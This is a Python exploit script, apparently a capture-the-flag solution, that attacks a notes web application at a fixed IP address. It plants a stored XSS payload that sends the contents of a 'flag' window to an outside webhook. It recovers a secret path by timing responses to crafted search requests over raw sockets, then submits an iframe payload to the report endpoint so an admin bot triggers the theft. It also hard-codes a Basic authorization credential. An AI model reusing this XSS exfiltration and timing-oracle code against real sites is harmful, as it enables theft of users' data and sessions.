import requests
from pwn import *
import time

url = "http://34.18.37.24:10505"
hook_url = "{webhook_url}"

s = requests.Session()


def convert_to_raw(preapred):
    return (
        preapred.method
        + " "
        + preapred.path_url
        + " HTTP/1.1\r\n"
        + "Host: 34.18.37.24:10505\r\n"
        + "\r\n".join([f"{k}: {v}" for k, v in preapred.headers.items()])
        + "\r\n\r\n"
        + preapred.body
    )


header = {"Authorization": "Basic YWM0NzUxYTEzYjEwZDU5NTplYjNiNzMwNmFlYjM0NzVk"}


def create_xss_note():
    payload = f"""
    <script>
    (async () => {{
    const w = window.open("","flag");
    await new Promise(r => setTimeout(r, 2000));
    open("{hook_url}?f="+encodeURIComponent(w.document.body.innerHTML));
    }})();
    </script>
    """
    r = s.post(
        url + "/create",
        data={"title": "xss", "note": payload},
        allow_redirects=False,
        headers=header,
    )
    print(r.text)
    r = r.headers.get("Location")
    return r


s.post(
    url + "/register", data={"username": "random", "password": "random"}, headers=header
)
s.post(
    url + "/login", data={"username": "random", "password": "random"}, headers=header
)

XSS_NOTE = create_xss_note()
known = ""
for i in range(8):
    k = 1
    while len(known) <= i:
        for j in "abcdefghijklmnopqrstuvwxyz0123456789":
            search = f"Flag-{known+j}******************"+i * i * "*" + k * k * "*"
            r = requests.Request(
                "POST",
                url + "/search",
                cookies=s.cookies.get_dict(),
                data={
                    "searchTitle": (
                        search
                    )
                },
                headers=header,
            ).prepare()

            io = remote("34.18.37.24", 10505)
            print("length:- ",len(search)-5)
            raw_request = convert_to_raw(r)
            io.send(raw_request.encode())
            io.recv(1024)
            t1 = time.time()
            io.recvall()
            t2 = time.time()
            print(i, known + j)
            if t2 - t1 > 2:
                known += j
                print("the key ",i, known)
                break
            io.close()
        k += 2
print(known)

print(XSS_NOTE)

payload = f"""<iframe id="flag" name="flag" src="./{known}" ></iframe>
<iframe src="./..{XSS_NOTE.replace("/","%2f")}%2fraw/share" ></iframe>"""

print(payload)

print(
    s.post(url + "/report", data={"title": "xss", "note": payload}, headers=header).text
)